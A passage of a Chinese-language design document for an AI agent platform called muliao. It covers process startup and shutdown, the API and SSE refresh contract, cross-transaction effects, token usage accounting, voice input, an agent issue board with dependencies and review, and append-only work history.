- **单进程**：写事务串行依赖进程内的单写者线程，所以只跑一个进程；启动时先占端口，同一个库上已有服务在跑就当场退出，不先续跑会话（否则同一个工具调用会被执行两次）。这不限制并发：不同会话、不同 agent 并行，同一会话串行，模型请求按 provider 限流；模型调用与工具执行都是异步 IO，不占写线程。
- **启动顺序**（`App::start`，都在对外服务之前）：确保全局记忆在 → 报出残留的工作目录 → 接着删上次没删完的 agent → 收掉上次没收尾的后台任务并起运行中检查 → 续跑会话 → 起触发器 → 起资源目录的文件监听（变了推 SSE `changed`）。**关停**（SIGTERM）：关展示总线、HTTP 最多再等 3 秒 → 停触发器的循环与流式命令 → 结束后台任务（记为被中断，下次启动时交回会话）；正在跑的运行随进程结束，下次启动时从上一步续跑。
- **安装布局**：二进制 `muliao [-c 配置] [--web-dir 前端构建目录]`，默认在可执行文件旁边的 `web/` 找前端构建；`muliao openapi` 打印接口描述。日志由进程自己按大小轮转（`log_file`、`log_max_mb`、`log_backups`），并把 stdout/stderr 指到当前文件（launchd 的 StandardOutPath 只在启动时打开一次）。
- **外部消息**：能保持长连接的由流式触发器监听，只能拉取的由定时触发器拉取；#645 删了 webhook。
- **压缩的覆盖范围**：按上一次请求报告的 token 在步间压缩，不预估下一次：一步的工具结果直接超出模型上限时运行失败可见，手动压缩后重试。不识别各提供方的超限错误，因为格式各异、无法可靠识别。
## 17. 前后端契约
- **接口类型只有一份**：后端的请求、响应类型与 SSE 事件类型就是契约，用 utoipa 从同一份声明生成路由与 OpenAPI（`http/src/api` 各模块）。`muliao openapi` 导出的描述提交为 `web/openapi.json`，前端类型 `web/src/schema.d.ts` 由它生成（openapi-typescript），两边测试各保证一致（后端 `crates/muliao/tests/frontend_contract.rs`）；改接口先重新生成再改前端。响应里每个字段都必有（值可能是 null），前端不必处处判 undefined。前端每个调用只写一次路径模板，参数与响应类型都从生成的类型推出（唯一例外是上传文件）。前端不解析工具结果文本，结构化状态（如 `ask_user`，见第 7 节）由后端给出；会话来源是按 `kind` 区分的判别联合，来源编号的存储格式只有会话领域认识。错误响应一律 `{"detail": "<原因>"}`：领域错误按种类映射成 4xx（脚本失败 502），外部服务出错 502 带原因，其余记 error 日志、对外只说 500（`http/src/error.rs`）。
- **数据库是唯一事实源，SSE 只是展示加速**：服务端在写过表的事务提交后发一条 `changed`；资源目录里的文件有改动（不论平台、agent 的 shell 还是用户在别处改的）也发。它不分类别，服务端不逐处通知「谁改了什么」，前端也不列「哪些操作改了什么」：不论谁改，正在显示的页面都刷新。
- **前端怎么重拉**：收到任何 `changed` 等 300ms 把一阵密集的合并成一次，重拉正在显示的数据；每条连接（含自动重连）收到第一次心跳时视为「连上了」并立即重拉，补上断线期间丢的事件（不在 `onopen` 判定：响应头早于服务端建立订阅）。多拉几次本机请求个人使用感觉不到，换来接口不必声明读了什么、前端不必按类别订阅。例外只给重拉代价大的（会话页只按本会话的事件刷新）和不随服务端变的（不自动刷新）。操作成功后自己等正在显示的数据重拉落下，不依赖 SSE 送达。
- **编辑不被刷新冲掉、不盖掉别人的改动**：表单有基线和草稿，没改过时跟上服务端新值，改过就不再跟。按字段保存的（agent 配置、角色、issue、触发器）只提交改过的字段，编辑期间别人改了别的字段不会被旧值盖掉；同一字段两边都改，后保存的覆盖先保存的（issue 时间线里看得到，可改回）。整份保存的文件（记忆、SKILL.md）带开始编辑时的内容摘要，写前与此刻文件比对，期间被改、删或抢先建了就 409，用户从最新内容重来。
- **实时条目与历史同一个投影**（`sessions/src/transcript.rs`）：前端把会话快照与之后的事件按段和序号拼接，不自己投影。工具的展示规则挂在工具定义处（`ToolTraits::render`，`platform/src/tool_views.rs`）、与工具在同一处认自己的结果格式，投影据此附上结构化展示块（终端、代码、diff、表格等，不是 HTML）；没规则（含全部 MCP 工具）、参数不合 schema、结果认不出时显示原文。网页抓取的内容不按 Markdown 渲染，免得加载里面的外部图片。通知的跳转地址只由后端给出。

## 18. 不在同一事务里的效果：三条判据
| 效果 | 失败可见 | 可收敛 | 代价 |
|---|---|---|---|
| 推送 | 最终失败（被拒、约 30 分钟重试用完）记 error 日志 | 写通知与运行收尾同一事务，提交后每台设备一个任务、内存里退避重试 | 晚几百毫秒；重试期间重启丢这条推送（通知与角标还在）；同一会话不保证顺序 |
| 运行的暂时性失败 | 会话页显示「在重试」与错误；最终失败记在运行记录上并推送 | 每步保存，actor 内退避约 30 分钟；重启后从上一步续跑 | 重试期间多占一个 provider 并发名额的时段 |
| 停止后停下委派的 thread | 失败记 error 日志 | 停止事务提交后各自停下（逐层）；已删除的 thread 什么都不做；已 cleared 的结局不投 | 停下前 thread 可能多跑出一小段（存为被停止）；恰好在这之间重启则 thread 跑完，结局没人收 |
| 停止后结束后台任务 | 照看者记下 killed | 提交后杀进程组；没有照看者的由启动时对账收敛 | 无 |
| 删除 agent 的文件 | 「正在删除」状态，失败报给调用方并记日志 | 每步幂等，启动时接着删 | 从列表消失与目录删除之间有窗口 |
| 后台任务结局没写进库 | 行留在 running 可查，记 error 日志 | 下次启动时记为被中断并交回会话 | 对账前多占一行，会话一直 waiting |

## 19. 用量
- **记什么**：每次模型请求花掉的 token，记到 agent 与会话名下，唯一写入方是调用模型的 `runtime`（`usage` 领域只存与汇总）。会话运行每收到一次完整回复就先记一笔再保存这一步，会话页累计随之更新；中途失败或被停止的那次请求拿不到用量，不记。记不上的并入下一笔，不丢不重；运行结束时还有没记上的记 error 日志。口径：输入总数已含缓存读写，展示为「总数与其中两部分」不相加；重试真的再花了 token，重复计数是对的。
- **记账不属于这次运行**：写入失败只记日志，不改变运行的结果或错误——记账故障不该让做完的工作白做，也不该把真正的失败换成另一个。汇总时取出行在内存里按 agent / 模型 / 天（按配置时区）相加，个人规模可接受，换来分组与时区规则只写一遍。只增不改、不参与删除清理：删了 agent 或会话不等于钱没花过。

## 20. 语音输入
用户按住麦克风说话（常中英混杂），录音交给配置的转写服务（`speech` 领域，`[transcription].type`）转成文字，接进输入框照常发出；agent、消息与历史都不知道语音的存在，录音不落盘。现用百炼的录音文件识别，中英混杂原样输出；不用全模态对话模型，它要靠提示约束才不去回答语音内容，还会先思考，慢且不稳。上游出错返回 502 带原因，用户重录即可，不重试；没配置转写或浏览器不能录音时不显示麦克风。

## 21. issue 看板
- **三个字段**：状态 backlog / in_progress / in_review / blocked / done / cancelled；负责项目 owner（一个 agent，创建时必填，不随指派变，按它看一个项目的来龙去脉）；指派人 assignee（agent、用户或空：现在谁在做）。不设 todo（给 agent 的一建就投，与 in_progress 无别），不设 waiting：让 agent 自己维护「在等什么」不可靠，等上游由依赖派生，等后台任务、委派、唤醒由 issue 会话的工作状态看出。只有用户能解决的用 blocked 指派用户。
- **时间线与 issue 会话**：每次创建、评论、每个真正变了的字段各记一条只增不改的动态，动态按种类是类型（`issues/src/activity.rs` 的 `Happening`）；一次改动的后果（记动态、投递、通知用户、放行下游）在变更单元（`issues/src/change.rs`）的闭包正常返回时一处结算，只从这次的动态推出，出错不结算。每条动态记下发生在哪个会话，用户能点开看 agent 在别处做到哪一步才建的 issue。每个（issue, agent）对应唯一一个会话，归会话领域、按需新建，issue 不存会话 id；issue 只在它自己的会话里做，普通对话只建、只派，没有认领或让出的登记。
- **依赖**（有向无环图，`issues/src/graph.rs`）：让几件事按先后做而不是同时抢。成组的 issue 一次调用建完（本批用本地 key 互指），任一项不合法整批不建、提交后才投递——曾见 agent 并行逐个建，拿不到上游编号，子 issue 开工后依赖才补上。上游 done 或 cancelled 就算完成（取消也放行，下游自己判断还做不做）；有没完成的上游时下游照常记动态但不投、不算停滞。下游状态不随上游变：上游完成时投一封信让它开工，上游被重开下游自然回到等待。成环当场拒绝并给出环上的路径。
- **投递**：动态投进收件人的 issue 会话，收件人是动作之后的指派 agent，且 issue 处于 in_progress、不在等上游（`rules::recipient`）。信只有一行摘要、这次的动态原文和「用 `issue_show` 看全文」，不随时间线变长；处理指引是固定文本，放在会话来源说明里（缓存前缀），不每封重复。一次修改几个字段只投一封。被指派 agent 在自己这个 issue 会话里的动作不投回（防自激），在别的会话里的照常投。
- **唤起 owner 与投不进**：按上面规则没有收件人时，用户的评论投给 owner，由它决定关掉、派人还是回复；agent 的评论和修改不唤起 owner，免得 agent 之间来回唤醒。收件 agent 已归档时，用户自己的动作就推送告诉他（只有他能处理），别人的只记日志，免得周期触发器每周期推一条。
- **停滞与运行结束表态**：in_progress、不在等上游、指派给 agent 而它的 issue 会话空闲（在等后台任务、委派、唤醒或回答的不算）即停滞，界面标「没人在处理」。issue 会话里一次运行结束后若因此停滞（订阅 `RunEnded`），以该 agent 名义投一封信请它表态：做完、blocked 指派用户，或用等待手段挂起；只写评论不算，每次这样停下都问（用户定），不设次数上限。这不是续跑，不重跑原任务。
- **叫停与改状态分开；删除与失败**：改状态没有副作用（否则 agent 做完先改状态再留言就被误杀），停正在做的工作用 `issue_stop`：经会话领域的 `Stopper` 与用户点停止同一条路径停掉该会话，再改状态（不能进 in_review / done）；带留言时直接投进被停的会话收尾或改方向。删 agent 时它的指派、负责置空。issue 会话的运行最终失败只记一条动态（订阅 `RunFailed`），不投、不改状态：投进去等于自动重试，永久性错误会陷入循环；通知由通知领域统一做（第 14 节）。
- **先审核再完成**：agent 做完设 in_review 指派给用户，用户通过（done）或填理由打回（回到 in_progress，指派给交出它的 agent）；只对当前指派给用户且未结束的 issue 有效，否则冲突，连点、两台设备或过时的通知都不会盖掉别人刚做的事。例外：有下游依赖它（典型是拆出的子 issue）时 agent 自己设 done 放行下游，父 issue 在子 issue 全部完成后才投递、验收后照常交用户。这些是写在来源说明和工具说明里的约定，代码不拦。

## 22. 工作历史
- **冷历史**（`history/src/log.rs`）：agent 自己用 `history_append` 写，一件事一条，每日自进化时总结前一天；平台不拦重复，靠先查再写。它是事实不是规则，不约束做法。只追加：库里用触发器拒绝改删，删 agent 也不清理（同用量），重建这张表的迁移必须重建这些触发器。检索关键词都不短于 3 字符时走 FTS5 trigram（中文可用）按 bm25 相关度排，否则逐词 LIKE；不做 embedding，语义问题由 agent 按时间捞出一段自己判断。
- **热历史**：还没总结的活动直接从会话领域的读模型（`sessions/src/recall.rs`）与 issue 看板读，两个只读工具进 base：`activity_overview` 汇总某天有活动的会话、用户说的话、对相关 issue 的操作、失败的运行和当天的冷历史；`session_read` 读一个会话的时间线，与会话页同一份投影。「用户说了什么」只按信件记下的发送方认，不从文字猜；`labels` 与 `grep` 分开，因为 grep `USER` 会命中 `/Users/` 路径。输出在整行或整条处截断、给 `offset` 接着读。
